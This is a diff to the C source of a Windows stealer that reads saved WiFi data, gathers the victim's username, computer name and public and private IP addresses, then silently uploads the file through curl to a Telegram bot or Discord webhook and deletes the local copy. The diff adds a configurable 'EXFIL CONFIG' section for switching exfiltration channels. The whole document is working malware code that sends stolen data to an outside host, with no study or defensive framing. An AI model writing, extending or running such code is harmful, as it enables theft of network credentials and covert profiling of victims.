@@ -19,9 +19,32 @@
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "winhttp.lib")
 
-// Telegram config
-#define BOT_TOKEN "YOUR_BOT_TOKEN_HERE"
-#define CHAT_ID "YOUR_CHAT_ID_HERE"
+// ══════════════════════════════════════════════════
+// EXFIL CONFIG — Set via compiler flags:
+//
+// Telegram:  cl ... /DUSE_TELEGRAM /DTG_TOKEN="bot_token" /DTG_CHAT="chat_id"
+// Discord:   cl ... /DUSE_DISCORD /DDC_WEBHOOK="webhook_url"
+//
+// If nothing is defined, defaults to Telegram with these values:
+// ══════════════════════════════════════════════════
+
+#if !defined(USE_TELEGRAM) && !defined(USE_DISCORD)
+#define USE_TELEGRAM
+#endif
+
+#ifndef TG_TOKEN
+#define TG_TOKEN "YOUR_BOT_TOKEN"
+#endif
+
+#ifndef TG_CHAT
+#define TG_CHAT "YOUR_CHAT_ID"
+#endif
+
+#ifndef DC_WEBHOOK
+#define DC_WEBHOOK ""
+#endif
+
+// ══════════════════════════════════════════════════
 
 // Write results to a temp file
 void grab_wifi(const char *outpath) {
@@ -136,40 +159,78 @@ void grab_wifi(const char *outpath) {
 }
 
 // Send file to Telegram using curl (simpler than WinHTTP for multipart)
-void send_telegram(const char *filepath) {
-    char cmd[2048];
-    char compName[256], userName[256], pubIP[64] = {0};
+// Get machine info (cached)
+static char g_info_caption[512] = {0};
+
+void init_info() {
+    if (g_info_caption[0] != 0) return;
+
+    char compName[256], userName[256], pubIP[64] = {0}, privIP[64] = {0};
     DWORD s1 = sizeof(compName), s2 = sizeof(userName);
     GetComputerNameA(compName, &s1);
     GetUserNameA(userName, &s2);
 
-    // Get public IP
+    // Public IP
     system("C:\\Windows\\System32\\curl.exe -s ipinfo.io/ip > %temp%\\ip.txt 2>nul");
-    char ipFile[MAX_PATH];
-    GetTempPathA(MAX_PATH, ipFile);
-    strcat(ipFile, "ip.txt");
-    FILE *ipf = fopen(ipFile, "r");
-    if (ipf) { fgets(pubIP, sizeof(pubIP), ipf); fclose(ipf); DeleteFileA(ipFile); }
+    char tmp[MAX_PATH];
+    GetTempPathA(MAX_PATH, tmp);
+    char ipf[MAX_PATH];
+    snprintf(ipf, MAX_PATH, "%sip.txt", tmp);
+    FILE *f = fopen(ipf, "r");
+    if (f) { fgets(pubIP, sizeof(pubIP), f); fclose(f); DeleteFileA(ipf); }
     char *nl = strchr(pubIP, '\n'); if (nl) *nl = 0;
     nl = strchr(pubIP, '\r'); if (nl) *nl = 0;
 
-    // Get private IP
-    char privIP[64] = {0};
-    system("powershell -c \"(Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notmatch '127.0.0.1'} | Select-Object -First 1).IPAddress\" > %temp%\\priv.txt 2>nul");
-    char privFile[MAX_PATH];
-    GetTempPathA(MAX_PATH, privFile);
-    strcat(privFile, "priv.txt");
-    FILE *pf = fopen(privFile, "r");
-    if (pf) { fgets(privIP, sizeof(privIP), pf); fclose(pf); DeleteFileA(privFile); }
-    nl = strchr(privIP, '\n'); if (nl) *nl = 0;
-    nl = strchr(privIP, '\r'); if (nl) *nl = 0;
+    // Private IP
+    char pf[MAX_PATH];
+    snprintf(pf, MAX_PATH, "%spriv.txt", tmp);
+    system("ipconfig | findstr /i \"IPv4\" > %temp%\\priv.txt 2>nul");
+    f = fopen(pf, "r");
+    if (f) {
+        char line[256];
+        while (fgets(line, sizeof(line), f)) {
+            char *colon = strchr(line, ':');
+            if (colon) {
+                colon++;
+                while (*colon == ' ') colon++;
+                nl = strchr(colon, '\r'); if (nl) *nl = 0;
+                nl = strchr(colon, '\n'); if (nl) *nl = 0;
+                strncpy(privIP, colon, sizeof(privIP)-1);
+                break;
+            }
+        }
+        fclose(f);
+        DeleteFileA(pf);
+    }
 
+    snprintf(g_info_caption, sizeof(g_info_caption),
+        "%s@%s [pub:%s priv:%s]", userName, compName, pubIP, privIP);
+}
+
+void send_file(const char *filepath) {
+    init_info();
+    char cmd[2048];
+
+#ifdef USE_TELEGRAM
     snprintf(cmd, sizeof(cmd),
-        "C:\\Windows\\System32\\curl.exe -s -F \"chat_id=" CHAT_ID "\" "
+        "C:\\Windows\\System32\\curl.exe -s "
+        "-F \"chat_id=" TG_CHAT "\" "
         "-F \"document=@%s\" "
-        "-F \"caption=WiFi_%s@%s [pub:%s priv:%s]\" "
-        "\"https://api.telegram.org/bot" BOT_TOKEN "/sendDocument\" >nul 2>nul",
-        filepath, userName, compName, pubIP, privIP);
+        "-F \"caption=%s\" "
+        "\"https://api.telegram.org/bot" TG_TOKEN "/sendDocument\" >nul 2>nul",
+        filepath, g_info_caption);
+#endif
+
+#ifdef USE_DISCORD
+    // Discord webhook sends file as multipart
+    snprintf(cmd, sizeof(cmd),
+        "C:\\Windows\\System32\\curl.exe -s "
+        "-F \"file=@%s\" "
+        "-F \"payload_json={\\\"content\\\":\\\"%s\\\"}\" "
+        "\"" DC_WEBHOOK "\" >nul 2>nul",
+        filepath, g_info_caption);
+#endif
+
     system(cmd);
 }
 
@@ -188,7 +249,7 @@ int main() {
     grab_wifi(outFile);
 
     // Send to Telegram
-    send_telegram(outFile);
+    send_file(outFile);
 
     // Clean up
     DeleteFileA(outFile);
